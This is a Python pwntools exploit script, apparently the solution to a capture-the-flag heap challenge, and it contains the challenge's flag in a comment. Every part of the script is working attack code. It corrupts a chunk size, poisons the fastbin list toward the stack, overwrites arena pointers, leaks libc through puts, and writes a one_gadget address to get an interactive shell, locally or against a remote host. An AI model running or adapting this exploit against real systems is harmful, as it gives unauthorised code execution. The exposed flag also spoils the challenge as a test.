#!/usr/bin/env python2

import sys
import argparse
import time
from pwn import *

# flag{d0n7_let_m3_g3t_1n_my_z0n3}
menu = "1) Allocate block\n2) Delete block\n3) Write to last block\n4) Print last block\n5) Exit"

def allocate(size):
    p.sendlineafter(menu, "1")
    time.sleep(0.1)
    p.sendline(str(size))

def delete():
    p.sendlineafter(menu, "2")

def write(content):
    p.sendlineafter(menu, "3")
    time.sleep(0.1)
    p.sendline(content)

def exploit():

    p.recvuntil("Environment setup:")
    stack = int(p.recvline().strip(), 16)
    log.info("Stack : {}".format(hex(stack)))

    # Overwrite next chunk with size of 0x80
    allocate(0x40)
    write("A" * 0x40 + p8(0x80))

    # Allocate and delete chunk to persist new 0x80 size
    allocate(0x40)
    delete()

    # Allocate 0x80 size in fast chunk list
    allocate(0x80)
    # Overwrite linked list ptr of next chunk
    write("A" * 0x40 + p64(0x40) + p64(stack + 0x8))

    # Allocate 0x40 to add overwritten pointer in free list
    allocate(0x40)

    # Overwrite arena pointers
    allocate(0x40)
    payload = ""
    payload += p64(0x80) + p64(0x607010) + p64(0x607010)
    payload += p64(0x100) + p64(0x607000) + p64(0x607000)
    payload += p64(0x200) + p64(stack - 328)
    write(payload)

    # Leak through 0x80 chunks
    allocate(0x80)

    p.sendline("4")
    p.recvuntil("Exit\n")
    puts = u64(p.recv(6).ljust(8, "\x00"))
    libc = puts - 0x06f690
    gadget = libc + 0xf0274
    log.info("libc : {}".format(hex(libc)))
    log.info("one_gadget : {}".format(hex(gadget)))

    # Write through 0x200
    allocate(0x200)
    write(p64(0) * 0x2)

    # Write through 0x100
    allocate(0x100)

    payload = "A" * 8
    payload += p64(gadget) + p64(gadget)
    pause()
    write(payload)

    p.interactive()

if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "%s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    env = args.env
    loot = {}

    if env == "local":
        p = process([args.binary], env={"LD_PRELOAD" : "./libc"})
        log.info(util.proc.pidof(p))

    elif env == "remote":
        p = remote(args.i, args.p)

    pause()
    exploit()
